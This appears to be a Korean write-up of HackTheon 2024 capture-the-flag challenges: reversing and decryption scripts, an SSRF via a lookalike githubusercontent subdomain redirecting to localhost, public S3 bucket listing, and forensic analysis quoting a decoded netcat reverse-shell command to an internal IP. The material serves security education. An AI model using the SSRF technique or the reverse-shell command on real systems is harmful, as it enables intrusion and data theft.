진행하게 되면 5번이 정상적으로 진행돼서 checking transaction이라는 문구가 나옵니다.

저희가 원하는 문구는 sending transaction 임으로, 6번을 대상으로 진행해봅니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUcG5j2Sm2qNxOcWE-X1uAImya1Ck5DVh2FamcQZagTwqFXodb7EgReX9JoEgjjTcc3o0qJpkIJbtOb3Ro0-E3GUQb_pwC8ZskeJdA7JgYJi2ywN-5Wf3Swn-09CTM6MVqLlKNSfndtCrYfbq10dHapJuD5LldA=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

여기서 account not found가 나오는데, 6번이 sending transaction 이라 가정하면 account not found가 나오는것이 어느정도 말이 됩니다.



6번에 from to 와 같은 tx info를 담지 않았음으로 해당 값을 담아서 보내봅니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUfPm9ebC95gMeIrhCJK3WHbmcgjGYk-dg_QRPQXFP59q99egO-QgX6yXzWswkY9hGK7zHkcg05sUyM3LBkFBgtIiIn38a2-kEFsvzlwW2pFsslYSEIJpE2r4sSjv5ElQLr1yGpshTb5VoBAozw8V7BM9tDv518=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

또 account not found가 나오게 됩니다.

여기서 이전 5번을 실행했을 때 `Valid account. Restore Complete` 가 나왔었는데, 이게 account load 혹은 restore 라면 6번 실행 이전에 넣어주면 잘 실행될거 같다는 생각을 하고 진행합니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUeh6auQl3MKFR8nPxPbVUA-0ft9qDbdU4-KOPBoRWY8dMioNLb9sMyuNE0Ua1ftJgcg9ql9usBFpER-nmWEqg6I75MriDl6RzGVOcMSWFsDyRXUHciFZr8QCeG8TklLxVeJ8vDfTeMlJhh-NHugljx9P3b29kf8=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

원하는 문구인 `Sending transaction` 이 나오게 되었습니다!



이제 flag를 읽어주는 routine 이 있는 함수에 진입했음으로, ida를 통해 어떤 조건을 만족시켜야하는지 대략적으로 분석해야합니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUczJuYfWOf_mH4kb2Fo8hjtHBNjkUVokHOU0NReSkGyRt-HCTJZslahkaNQbPFrOtoTPQQkkNYTHLQVnWqtzaHDIsZuzSx19hozgy-QCp24RG0bV0yOIoOZPye-kQD7HyrHWqD35yioe8cU0Ygyg-QVtkqTq-0=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

대략적으로 보면 0x5f5e0ff(=99,999,999) 랑 비교를 하는걸 볼 수 있습니다.

대략 잔액이 해당 값 이상이면 될거 같다 유추를 하고, 어떻게 조작을 할지 고민을 해봅니다.

tx 를 보낼 때 amount를 적어 보내는데, 이 amount를 음수로 넣게 되면 어떻게 처리할지 궁금하여 넣어보았습니다

(만약 잘못 처리되게 되면, 돈을 보냈는데 제 잔액이 늘어날 수 있음으로)



![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUeda8502AQ7cQcEzyI0hduG-VmYeFZvO_jJRHk9zIvPkxTKJPMM_fzvWHGw5eruNe8egxJk1HAJ2AQgq6C4Gij-JsEWAckKi-mj-_NJv-ZH8pJuN-RevgBmxMVfaFlGpgvp4JvFD4VdaO2kU86aYZ7KV7ycz_JC=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

플래그를 얻게 되었습니다 :)


해당 문제를 통해서 reversing 문제의 직감적 접근의 흐름을 살펴보았습니다. 분석이 어렵거나 큰 바이너리의 경우 전부 분석해야하는 경우도 있지만, 이러한 방식으로 특정 부분의 간단한 분석과 상식적인 흐름으로 풀어낼 수 있는 경우도 있습니다.

## 5. Web - Revact

react native로 제작된 웹 사이트다. 브라우저 소스보기에서 Main.5e39c7c2.js를 분석해보면 비교 연산을 해주는 것을 확인할 수 있다. 해당 로직은 Input 받을 때 검증할 때 사용한다.
![](/assets/img/hacktheon2024/go4.png)
![](/assets/img/hacktheon2024/go5.png)

조건에 맞추어 파이썬 포팅하면 `XG@@DzX`가 나오고, 이를 입력해주면 flag를 획득할 수 있다.

```py
def find_valid_string():
    z_value = 'D'
    char_5 = z_value
    char_6 = chr(ord(char_5) + 54)
    char_2 = chr(ord(char_6) - 56 + 5)
    char_1 = 'X'
    char_3 = '@'
    char_4 = '@'
    char_7 = char_1
    e = char_1 + char_2 + char_3 + char_4 + char_5 + char_6 + char_7
    return e

e_string = find_valid_string()
print("Generated string:", e_string)
```

## 6. Web - GithubReadme

처음 웹사이트에 접속하면 git 레포지토리를 하나 입력받아 README.md의 내용을 가져오는 페이지가 주어진다.

주어진 소스코드 파일들을 참고하면 Django Ninja 라이브러리를 이용해 서비스를 구현한 것을 알 수 있다.

```python
@api.get("/admin", response={200: dict, 401: Error})
def admin(request):
    client_ip, is_routable = get_client_ip(request)
    if not is_routable:
        return {"msg": os.environ.get("FLAG")}
    else:
        return 401, {"msg": "ACCESS DENIED"}
```

플래그는 `/admin` 엔드포인트에서 환경 변수에 저장되어 있는 FLAG를 가져와 반환해준다. `/admin` 엔드포인트에 접근하기 위해서는 not is_routable, 즉 localhost로 요청을 보내야한다.


```python
@api.post("/view", response={200: str, 400: Error})
def view(request, path: Path):
    try:
        ip = get_client_ip(request)[0]
        if ReqLog.objects.filter(ip=ip, request_at__gt=timezone.now() - timedelta(seconds=10)).exists():
            return 400, {'msg': f"so Fast.. - {ip}"}
        else:
            ReqLog(ip=ip).save()
            github = Github.objects.filter(path=path)
            if github.exists():
                return github.first().readme
            url = (
                f"https://raw.githubusercontent.com{path.path}/{path.branch_name}/README.md"
            )
            URLValidator()(url)
            response = requests.get(url)
            if response.status_code != 200:
                return 400, {}
            readme = response.text
            Github(path=path, readme=readme).save()
            return readme
    except Exception as e:
        return 400, {"msg": e}
```

`api/api.py`의 `/view` 엔드포인트를 살펴보면 `path.path`, `path.branch_name`을 입력받아 python requests 패키지를 이용해 README.md의 내용을 가져온 후 DB에 저장한다.

`f"https://raw.githubusercontent.com/{path.path}/{path.branch_name}/README.md"`가 아닌 `f"https://raw.githubusercontent.com{path.path}/{path.branch_name}/README.md"` 로 받기 때문에 `raw.githubusercontent.com`으로 subdomain을 생성해 공격자의 웹사이트로 요청을 보낼 수 있다.

`raw.githubcontent.com.cykorfighting.kro.kr`, 팀 서버 IP로 A 레코드를 생성해 진행하였다. 처음에는 문제 풀이 서버에 CNAME을 걸어 바로 접근하려고 시도했으나, Django의 `manage.py runserver`가 https를 지원하지 않기 때문에 이 방식으로는 SSRF가 불가능하다.

하지만, 서브 도메인으로 연결한 본인 웹사이트에 문제 풀이 서버의 `/admin` 엔드포인트로 redirection을 걸어주면 오류 없이 정상적으로 우회가 가능하다. 

```
raw.githubusercontent.com.cykorfighting.kro.kr {
	redir "http://localhost:8044/api/admin"
}
```

redirection을 할 수 있는 여러가지 방법 중, Caddy Web Server을 이용하여 진행하였다.

최종적으로 path.path에 `raw.githubusercontent.com.cykorfighting.kro.kr`, path.branch_name에 `#`을 넣고 `/view` 엔드포인트에 요청을 보내면 플래그를 획득할 수 있다.

![](/assets/img/hacktheon2024/image4.png)

`J_DN5_S5L_CUST0M_JH`

## 7. Web - DogGallery

처음 주어진 웹사이트에서 AWS 버킷에서 이미지만 불러오고, API 서버와 통신하는 동작은 따로 존재하지 않는다.

하지만, 문제 태그가 `Trend`이기에 Cloud와 연관이 있다는 것을 유추할 수 있다.

AWS에서는 Bucket S3이라는 서비스를 통해 Static 파일들을 제공하는데, 권한 설정 오류로 인한 버킷 내부 파일 노출이 가능하다.

![](/assets/img/hacktheon2024/image1.png)

이 문제에서 사용하는 htodogpics 버킷의 경우, 사용자 인증 절차를 따로 거치지 않아도 접근이 되는 취약점이 있어 awscli의 `aws s3 ls s3://htodigpics --no-sign-request` 명령어를 통해 플래그 텍스트 파일이 존재하는 것을 알 수 있다.

![](/assets/img/hacktheon2024/image2.png)

이후, 찾아낸 텍스트 파일에 접근하여 플래그를 획득할 수 있다.

FLAG: `IMPORTANT_S3_P0L1CY_ByJ`

## 8. Reversing - Decrypt Message 1

문제는 바이너리 없이 소스코드만 주어졌습니다.

main은 암호화된 결과를 순서대로 앞에서부터 hex로 출력해주는 역할만을 합니다.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned long* encryption(unsigned long data[], unsigned long size)
{
    unsigned int eax;
    unsigned int edx;
    unsigned int ecx;
    unsigned int byte_address;

    for (byte_address = 0; byte_address < size; byte_address++)
    {
        eax = data[byte_address];
        ecx = eax + 0x11;
        eax = eax + 0xB;
        ecx = eax * ecx;
        edx = ecx;
        edx = edx >> 8;
        eax = edx;
        eax = eax ^ ecx;
        eax = eax >> 0x10;
        eax = eax ^ edx;
        eax = eax ^ ecx;
        data[byte_address] = eax;
    }
    return data;
}

unsigned long* _encryption(void* data, unsigned long size)
{
    unsigned long* data_chunk = NULL;
    unsigned long* result;
    int i;

    if (size & 1) size++;
    data_chunk = (unsigned long*)malloc(size * sizeof(unsigned long));
    if (!data_chunk) return NULL;
    memset(data_chunk, 0, size * sizeof(unsigned long)); // Ensure memory is initialized to zero
    for (i = 0; i < size / 2; i++) data_chunk[i] = ((unsigned short*)data)[i];

    result = encryption(data_chunk, size / 2); // Adjusted the size passed to encryption
    return result;
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        printf("Usage: %s <text to encrypt>\n", argv[0]);
        return 1; // Exit if no argument is provided
    }

    const char* input = argv[1];
    unsigned long size = strlen(input); // Use the length of the input argument
    // Ensure the input is treated correctly based on how _encryption function is expected to work
    unsigned long* encrypted_data = _encryption((void*)input, size);

    // Print each encrypted unsigned long in hexadecimal format
    printf("Encrypted data in hexadecimal format: ");
    for (unsigned long i = 0; i < (size + 1) / 2; i++) { // Adjusted loop condition based on encryption function logic
        printf("%lx", encrypted_data[i]);
    }
    printf("\n");

    free(encrypted_data); // Remember to free the allocated memory

    return 0;
}

```

_encryption은 입력을 2바이트씩 잘라서 4바이트 크기의 data_chunk 배열에 저장합니다.

그리고 이를 encryption에서 호출합니다.

즉 main 로직은 encryption 함수입니다.

```c
unsigned long* encryption(unsigned long data[], unsigned long size)
{
    unsigned int eax;
    unsigned int edx;
    unsigned int ecx;
    unsigned int byte_address;

    for (byte_address = 0; byte_address < size; byte_address++)
    {
        eax = data[byte_address];
        ecx = eax + 0x11;
        eax = eax + 0xB;
        ecx = eax * ecx;
        edx = ecx;
        edx = edx >> 8;
        eax = edx;
        eax = eax ^ ecx;
        eax = eax >> 0x10;
        eax = eax ^ edx;
        eax = eax ^ ecx;
        data[byte_address] = eax;
    }
    return data;
}

```

encryption 함수에서는 2바이트씩 암호화를 진행합니다.이때 data 배열은 4바이트이기에  최종적으로 2바이트=>4바이트로 암호화가 진행됩니다. 이는 간단하게 brute-force로 해결할 수 있습니다.


```python
import string
import itertools
enc="188d1f2f13cd5b601bd6047f4496ff74496ff74496ff70"
enc=[0x188d1f2f,0x13cd5b60,0x1bd6047f,0x4496ff7,0x4496ff7,0x4496ff7]
flag=""
able=list(map(ord,string.printable))
for i in range(len(enc)):
	for perm in itertools.product(able, repeat=2):
		m=(perm[1]<<8)+perm[0]
		eax = m
		ecx = eax + 0x11;
		eax = eax + 0xB;
		ecx = eax * ecx;
		edx = ecx;
		edx = edx >> 8;
		eax = edx;
		eax = eax ^ ecx;
		eax = eax >> 0x10
		eax = eax ^ edx;
		eax = eax ^ ecx;
		if eax==enc[i]:
			flag+=chr(perm[0])
			flag+=chr(perm[1])
print(flag)
```

위 코드로 플래그를 얻을 수 있습니다. 이때 문제 코드에서는 최종 암호화된 결과가 hex값으로 출력되는데 그 범위가 정확히 4바이트로 출력되지는 않아서 임의로 4바이트,3.5바이트씩 잘라서 결과가 출력되는 값을 얻어내야 했습니다.

flag : ```GODGPT!!!!!!```

## 9. Reversing - Decrypt Message 2

IDA로 main을 열어보면 `srand(time(NULL))`을 사용하면서 프로그램 내에서 랜덤 값을 사용하는 것을 볼 수 있습니다. 즉, 이 프로그램은 실행할 때마다 바뀌는 프로그램이 될 것입니다.

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  unsigned int v3; // eax
  char *ptr; // [rsp+8h] [rbp-18h]

  v3 = time(0LL);
  srand(v3);
  ptr = sub_16A0(off_4010, 5LL);
  printf("encryptedFlag @ %s\n", ptr);
  free(ptr);
  return 0LL;
}
```

그 후 off_4010과 5를 인자로 sub_16A0의 로직을 실행 한 후 encrypted Flag를 출력해줍니다.

![](/assets/img/hacktheon2024/off4010.png)

4010에는 ```THIS_IS_FAKE_FLAG!!!``` 라는 fake flag가 들어있습니다.

```c
const char *__fastcall sub_16A0(const char *a1, unsigned int a2)
{
  __int64 v3; // [rsp+10h] [rbp-40h]
  void *v4; // [rsp+18h] [rbp-38h]
  void *ptr; // [rsp+20h] [rbp-30h]
  char *v6; // [rsp+28h] [rbp-28h]
  unsigned int v7; // [rsp+30h] [rbp-20h]

  v7 = strlen(a1);
  if ( v7 % a2 )
    return "";
  v6 = sub_1530(a2);
  printf("key @ %s\n", v6);
  ptr = sub_1600(a1, v7);
  v4 = sub_1600(v6, a2);
  sub_1270(ptr, v4, v7, a2);
  sub_1310(ptr, v4, v7, a2);
  v3 = sub_11C0(ptr, v7);
  free(ptr);
  free(v4);
  free(v6);
  return v3;
}
```

16A0은 전반적인 암호화에 해당하는 함수입니다. 

앞에서 가져온 fake flag의 길이가 5로 나누어 떨어지지 않는다면 바로 프로그램을 종료시킵니다.

즉 fake flag는 5의 배수여야합니다. 그 후 sub_1530,sub_1600,sub_1270,sub_1310,sub_11c0등 함수들을 반복합니다.

```c
_BYTE *__fastcall sub_1530(int a1)
{
  int i; // [rsp+14h] [rbp-2Ch]
  _BYTE *v3; // [rsp+18h] [rbp-28h]
  int v4; // [rsp+24h] [rbp-1Ch]

  v4 = strlen("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789");
  v3 = malloc(a1 + 1);
  for ( i = 0; i < a1; ++i )
    v3[i] = aAbcdefghijklmn[rand() % v4];
  v3[a1] = 0;
  return v3;
}

```

sub_1530 함수는 `A~Z,a~z,0~9`의 범위내에서 5개의 문자를  시간 기반의 랜덤으로 추출하여 반환해줍니다.

```c
  printf("key @ %s\n", v6);
```

그리고 해당 함수 아래에서 key를 출력해주므로 위에서 추출한 5개의 문자를 암호화에서 key로 사용한다는 것을 알 수 있습니다. 

```c
_DWORD *__fastcall sub_1600(__int64 a1, int a2)
{
  int i; // [rsp+Ch] [rbp-24h]
  _DWORD *v4; // [rsp+10h] [rbp-20h]

  v4 = malloc(4LL * a2);
  for ( i = 0; i < a2; ++i )
    v4[i] = *(a1 + i);
  return v4;
}
```

sub_1600은 값을 옮기는 부분입니다.

```c
unsigned __int64 __fastcall sub_1270(__int64 a1, __int64 a2, int a3, int a4)
{
  int i; // [rsp+Ch] [rbp-24h]

  for ( i = 0; i < a3; ++i )
    *(a1 + 4LL * i) ^= *(a2 + 4LL * (i % a4));
  return __readfsqword(0x28u);
}
```

sub_1270은 xor연산을 진행하는 부분입니다.  fake flag와 위에서 추출한 5개의 문자를 xor합니다. 이때 5개의 문자는 fake flag 길이만큼 반복 xor 연산됩니다.

```c
unsigned __int64 __fastcall sub_1310(__int64 a1, __int64 a2, int a3, int a4)
{
  int ii; // [rsp+4h] [rbp-4Ch]
  int n; // [rsp+8h] [rbp-48h]
  int m; // [rsp+Ch] [rbp-44h]
  _DWORD *ptr; // [rsp+10h] [rbp-40h]
  int v9; // [rsp+18h] [rbp-38h]
  int v10; // [rsp+18h] [rbp-38h]
  int k; // [rsp+1Ch] [rbp-34h]
  int j; // [rsp+20h] [rbp-30h]
  int i; // [rsp+24h] [rbp-2Ch]
  _DWORD *v14; // [rsp+28h] [rbp-28h]

  v14 = malloc(4LL * a4);
  for ( i = 0; i < a4; ++i )
    v14[i] = i;
  for ( j = 0; j < a4; ++j )
  {
    for ( k = j + 1; k < a4; ++k )
    {
      if ( *(a2 + 4LL * j) > *(a2 + 4LL * k) )
      {
        v9 = *(a2 + 4LL * j);
        *(a2 + 4LL * j) = *(a2 + 4LL * k);
        *(a2 + 4LL * k) = v9;
        v10 = v14[j];
        v14[j] = v14[k];
        v14[k] = v10;
      }
    }
  }
  ptr = malloc(4LL * a3);
  for ( m = 0; m < a3; m += a4 )
  {
    for ( n = 0; n < a4; ++n )
      ptr[n + m] = *(a1 + 4LL * (v14[n] + m));
  }
  for ( ii = 0; ii < a3; ++ii )
    *(a1 + 4LL * ii) = ptr[ii];
  free(ptr);
  free(v14);
  return __readfsqword(0x28u);
}
```

sub_1310은 5개의 문자열에 대해서  bubble sort를 진행하고 뒤바뀐 index를 v14에 기록해 놓습니다.

그리고 이를 이용해 sub_1270에서 xor을 진행한 결과 인덱스 연산해줍니다.

```c
char *__fastcall sub_11C0(__int64 a1, int a2)
{
  int i; // [rsp+Ch] [rbp-24h]
  char *v4; // [rsp+10h] [rbp-20h]

  v4 = malloc(2 * a2 + 1);
  for ( i = 0; i < a2; ++i )
    sprintf(&v4[2 * i], "%02x", *(a1 + 4LL * i));
  return v4;
}
```

sub_11c0은 최종적으로 암호화된 결과를 hex값으로 출력해주는 부분입니다.

이렇게 분석된 코드들을 파이썬으로 porting하여 하나의 코드로 나타내보겠습니다.

```python
# analysis.py
from ctypes import *
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(libc.time(0))

table=b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
key=[0]*5
for i in range(5):
	key[i]=table[libc.rand()%len(table)]
print("key @ ","".join([chr(i)for i in key]))
fake_flag=b"THIS_IS_FAKE_FLAG!!!"
out=[]
for i in range(len(fake_flag)):
        out.append((key[i%len(key)]^fake_flag[i]))

def swap(a1, a2, a3, a4):
    v14 = list(range(5))
    for j in range(5):
        for k in range(j + 1, 5):
            if a2[j] > a2[k]:
                a2[j], a2[k] = a2[k], a2[j]
                v14[j], v14[k] = v14[k], v14[j]
    ptr = []
    for m in range(0, 20, 5):
        ptr.extend(a1[(v14[n] + m)] for n in range(5))
    for ii in range(20):
        a1[ii] = ptr[ii]
    return a1


swapped=swap(out,list(key),20,5)
print("encryptedFlag @ ",bytes(swapped).hex())
```

![](/assets/img/hacktheon2024/ported.png)

time seed가 동일할 때 같은 암호화결과가 나옵니다.

이제 로직을 올바르게 구현했으니 fake flag가 아닌 온전한 flag를 얻어야 합니다.

문제 description에서 제시하고 있는 암호화 결과는 `446709213550020f3b28696533183206631e030743394d4531` 입니다. 이때 real flag의 첫 5자리는 ```BrU7e```로 주어졌습니다.

이 5자리의 real flag는 key와 xor되므로 이를 바탕으로 코드를 작성해보겠습니다.

```python
pull=list(b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
key=b"BrU7e"
out=bytes.fromhex("4467092135")
able=[]
for i in range(len(key)):
    for j in range(len(out)):
        target=key[i]^out[j]
        if target in pull:
            able.append(target)
able="".join([chr(i)for i in able])
print(able) 
```

플래그의 첫 5자리와 암호화된 결과를 xor 해서 key가 될 수 있는 후보들을 찾아줍니다.(Kcw6SG2tsPlDP)

```python
import itertools

def swap(a1, a2, a3, a4):
    v14 = list(range(5))
    for j in range(5):
        for k in range(j + 1, 5):
            if a2[j] > a2[k]:
                a2[j], a2[k] = a2[k], a2[j]
                v14[j], v14[k] = v14[k], v14[j]

    ptr = []
    for m in range(0, 20, 5):
        ptr.extend(a1[(v14[n] + m)] for n in range(5))

    for ii in range(20):
        a1[ii] = ptr[ii]
    return a1,v14

able="Kcw6SG2tsPlDP"
orig=b"BrU7eIS_FAKE_FLAG!!!"
enc=bytes.fromhex("446709213550020f3b28696533183206631e030743394d4531")

for perm in itertools.product(able, repeat=5):
    out=[]
    orig=b"BrU7eIS_FAKE_FLAG!!!"
    key="".join(perm)
    for i in range(len(orig)):
        out.append((ord(key[i%len(key)])^orig[i]))
    swapped,idx=swap(out,list(key),20,5)
    out=bytes(swapped)
    if out[:5]==enc[:5]:
        print("key:"+key)
        print(idx)
        break
```

이렇게 나온 key 후보들을 5자리의 무작위 배열로 암호화를 진행하여 나온 결과를 enc와 5자리까지만 비교했을 때 일치하는 값들을 골라보았습니다.

![](/assets/img/hacktheon2024/key_idx.png)



```w6tPl```가  key가 됩니다. 또한 bubble sort의 결과는```[1,3,4,2,0]``` 입니다. 

이 정보들로 역연산을 진행해주면 플래그를 얻어낼 수 있습니다.

```python
key=b"w6tPl"
enc=bytes.fromhex("446709213550020f3b28696533183206631e030743394d4531")

idx=[1, 3, 4, 2, 0]
out=[0]*len(enc)
count=0
for m in range(0,len(enc),5):
    for i in range(len(idx)):
        out[m+idx[i]]=enc[count]
        count+=1
flag=[]
for i in range(len(out)):
    flag.append(key[i%len(key)]^out[i])
print(bytes(flag))
```

key: `BrU7e_fORcE_l5_p0w3rFu1i!`

## 10. Forensic - PNG

sky.png 파일이 주어집니다. 파일이 깨져서 열리지 않습니다.

![](/assets/img/hacktheon2024/2.png)

Hex Viewer로 열게 되면 PNG 파일 시그니처가 없는 것을 확인할 수 있습니다.
![](/assets/img/hacktheon2024/3.png)

다른 정상 PNG 파일에서 없어진 헤더 부분을 가져다 복구하면 플래그를 확인할 수 있습니다.

![](/assets/img/hacktheon2024/4.png)

## 11. Forensic - Rumor1

Rumor 문제는 5개의 파트로 구성된 문제입니다. 첫번째 파트는 Mail 서버의 IP 주소를 찾는 문제로, evtx_dump를 이용해 xml로 추출하여 분석하였습니다.

![](/assets/img/hacktheon2024/image5.png)

mail 키워드를 검색하면 `mail.mnd.go.kr`, 즉 IP는 `92.68.200.206`인 것을 알 수 있다.

## 12. Forensic - Rumor2


두번째 파트는 공격자가 세션 연결을 위해 실행한 악성 프로세스의 PID를 구하는 문제입니다.

세션 연결을 위해서는 netcat, bash -i, python 등 여러 가지 방법으로 리버스 쉘을 열 수 있다.

![](/assets/img/hacktheon2024/image6.png)

이 문제에서는 `nc64.exe`를 사용해 리버스 쉘을 생성함을 확인할 수 있습니다.

`nc64.exe`의 PID는 `3868`이다.

## 13. Forensic - Rumor3


세번째 파트는 공격자가 추가적인 공격을 위해 스캔한 네트워크 대역를 찾는 문제이다.

네트워크 스캔은 일반적으로 python 스크립트, nmap, ping 등을 사용한다.

![](/assets/img/hacktheon2024/image7.png)

이 문제에서는 `python netscan.py`를 이용해 `192.168.100.x`를 스캔하는 것을 알 수 있다. 이것을 CIDR 영역으로 나타내면 `192.168.100.0/24`이다.


## 14. Forensic - Rumor4

Attacker 페이로드 분석하던중 `bmMgMTkyLjE2OC4xMDAuMzIgNTQ1NCAtZSAvYmluL2Jhc2g=====`가 존재했다. 이를 base64 복호화 해보니 `nc 192.168.100.32 5454 -e /bin/bash` 형태가 존재했고 이것이 정답이다.

![](/assets/img/hacktheon2024/go2.png)

## 15. Forensic - Rumor5

해당 문제는 최종적으로 탈취한 파일을 묻는 문제였다. 이벤트로그 중 curl을 통해서 read_file 요청을 보내는데 이 때 파일 이름이 `secret.tar.gz` 였다. 이것이 정답이다.
![](/assets/img/hacktheon2024/go1.png)

## 16. Forensic - Tracker1

Tracker 문제는 총 3단계로 이루어진 문제이다.

문제는 단계별로 이어지며, 하나의 단계를 건너뛰고 풀 수 없도록 구성되었다.

첫 번째 문제는 SNS에서 Drug 판매자의 `SNS ID`를 얻어오는 문제이다.

두 번째 문제는 Cryptocurrency 지갑으로부터 판매자의 `ETH Address`를 찾는 문제이다.

세 번째 문제는 판매자의 지갑으로 보낸 `Transaction ID`를 찾는 문제이다.

포렌식을 하기 위해서는 사용자의 `AppData` 폴더나 `Download`, `Desktop`, `Documents` 폴더를 유심히 봐야한다.

해당 문제는 Drug를 구매할 때 사용한 SNS에서, **Drug 판매자의 ID를 찾는 문제**이다.

통상 **Drug**를 구매한다고 생각하면, 개인정보 보호에 특화된 **SNS**를 사용하고, 잘 알려진 개인정보 보호 특화 **SNS**에는 **Telegram**, **Signal**이 있다.

 

![Tracker.ad1 - [root]→Users→User→AppData→Local→Programs→Session](/assets/img/hacktheon2024/Untitled.png)

Tracker.ad1 - [root]→Users→User→AppData→Local→Programs→Session

사용자의 `AppData` 폴더에서 Session이라는 SNS를 찾았고, 해당 SNS는 Signal 기반으로 개발되었음을 포럼에서 찾아볼 수 있었다.

![Trakcer.ad1 - [root]→Users→User→AppData→Roaming→Session](/assets/img/hacktheon2024/Untitled%201.png)

Trakcer.ad1 - [root]→Users→User→AppData→Roaming→Session

`AppData\Roaming` 폴더에는 대체로 **소프트웨어의 사용자 설정 파일, 데이터베이스 등이 포함**되어있다. Session SNS 또한 데이터베이스를 찾아볼 수 있었지만, **암호화** 되어있어 파일을 열어볼 순 없었다.

![Trakcer.ad1 - [root]→Users→User→AppData→Roaming→Session→config.json](/assets/img/hacktheon2024/Untitled%202.png)

Trakcer.ad1 - [root]→Users→User→AppData→Roaming→Session→config.json

키 값이 있지만 시간상 어떤 알고리즘을 이용하여 암호화 하는지 찾아보기 어려우므로 `config.json` 파일과 데이터베이스 파일인 `db.sqlite` 파일을 가상 환경에 복사하여 Session SNS를 마치 **타겟의 정보로 로그인된 것 처럼 동작**하도록 만들었다.

![Session SNS에 로그인 된 모습](/assets/img/hacktheon2024/Untitled%203.png)

Session SNS에 로그인 된 모습

![Session SNS → Drug 판매자의 이름은 David이고, 클릭해서 ID를 확인할 수 있다.](/assets/img/hacktheon2024/Untitled%204.png)

Session SNS → Drug 판매자의 이름은 David이고, 클릭해서 ID를 확인할 수 있다.

Drug 판매자의 ID는 `05aa64c6099f0e23345c279882edd6f73f4d20f5cc7aae2eef4874784ab4a50c77` 이다.

## 17. Forensic - Tracker2

해당 문제는 Drug 판매자의 ETH 주소를 찾는 문제이다.

이전 문제에서 사용되었던 Session SNS에서 ETH 주소를 찾아보려고 하였지만,  ETH 주소에 관하여 나눈 대화를 찾을 수 없었다.

![Untitled](/assets/img/hacktheon2024/Untitled%205.png)

따라서 포렌식 이미지 파일에서 가상화폐 관련 소프트웨어가 있을것이라고 판단하였다.

 

![Tracker.ad1 - [root]→Users→User→AppData→Local→Google→Chrome→User Data→Default→Extensions→nkbihfbeogaeaoehlefnkodbefgpgknn](/assets/img/hacktheon2024/Untitled%206.png)

Tracker.ad1 - [root]→Users→User→AppData→Local→Google→Chrome→User Data→Default→Extensions→nkbihfbeogaeaoehlefnkodbefgpgknn

따라서 Google Chrome의 검색 기록을 살펴보며 단서를 찾고 있던 도중, 확장 소프트웨어에서 `nkbihfbeogaeaoehlefnkodbefgpgknn` ID를 가진 확장을 찾을 수 있었고, 해당 확장은 암호화폐 지갑인 MetaMask임을 알 수 있었다.

![Untitled](/assets/img/hacktheon2024/Untitled%207.png)

![chrome-extension_nkbihfbeogaeaoehlefnkodbefgpgknn_0.indexeddb.leveldb→000004.log](/assets/img/hacktheon2024/Untitled%208.png)

chrome-extension_nkbihfbeogaeaoehlefnkodbefgpgknn_0.indexeddb.leveldb→000004.log

MetaMask의 로그를 보면 ETH 주소를 찾을 수 있다. 하지만 FLAG 체크 시 해당 주소는 판매자의 ETH 주소가 아니였다.

![Untitled](/assets/img/hacktheon2024/Untitled%209.png)

![Untitled](/assets/img/hacktheon2024/Untitled%2010.png)

**etherscan.io**에서 자금 흐름을 추적한 결과 최종 목적지 주소는`0xfC80B72Fcc371fFD9E1a2c33D4d7c6C00d0658D2` 임을 알 수 있었고, 해당 주소가 판매자의 ETH 주소였다.

## 18. Forensic - Tracker3

해당 문제는 판매자에게 송금한 ETH 트랜젝션 ID를 찾는 문제이다. 이전 문제에서 자금 흐름을 추적하였기 때문에, 트랜젝션 ID는 쉽게 찾을 수 있었다.

![Untitled](/assets/img/hacktheon2024/Untitled%2011.png)

타겟(자신)의 ETH 주소는 `0x45912905E6E79Ea74E3d5Ba0bA806e412712f94C` 이고, 외부로 나가는 송금의 트랜젝션 ID는 `0x2485878be80df93501b8a7caa7e70b616f4c5908f1599f6f0b869ed2fbc354a4` 이다.

## 19. Misc - MS office

![](/assets/img/hacktheon2024/preview.png)

주어진 문제의 압축을 풀게 되면 MS.xlsx 파일이 있습니다.

![](/assets/img/hacktheon2024/zip.png)


xlsx 파일은 zip 파일로 바꿀 수 있으므로 바꾸어주면 위처럼 여러 파일들이 나옵니다.

![](/assets/img/hacktheon2024/thumb.png)

이 중 문서의 메타데이터 파일, 썸네일 이미지등을 포함하는 docProps 폴더를 열어보면 thumbnail.jpeg가 들어있고 이를 열어보면 조그맣게 key가 보입니다.

![](/assets/img/hacktheon2024/thumbnail.png)

key:```th1S_1s_OOXML```


## 20. Misc - Confidential

`confidential.pdf` 파일이 하나 제공되고, PDF 내용에서 눈에 띄는 단서는 보이지 않는다.

먼저 이 파일에 숨겨진 파일이 있는지 찾고자 `binwalk confidential.pdf`를 실행하지만, 특이사항은 없었습니다.

```text
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PDF document, version: "1.6"
23823         0x5D0F          Zlib compressed data, default compression
24443         0x5F7B          Zlib compressed data, default compression
677567        0xA56BF         Zlib compressed data, default compression
681039        0xA644F         Zlib compressed data, default compression
682178        0xA68C2         Zlib compressed data, default compression
682898        0xA6B92         Zlib compressed data, default compression
683605        0xA6E55         Zlib compressed data, default compression
684204        0xA70AC         Zlib compressed data, default compression
684687        0xA728F         Zlib compressed data, default compression
685190        0xA7486         Zlib compressed data, default compression
687207        0xA7C67         Zlib compressed data, default compression
763218        0xBA552         Zlib compressed data, default compression
763340        0xBA5CC         Zlib compressed data, default compression
789938        0xC0DB2         Zlib compressed data, default compression
790043        0xC0E1B         Zlib compressed data, default compression
821754        0xC89FA         Zlib compressed data, default compression
821859        0xC8A63         Zlib compressed data, default compression
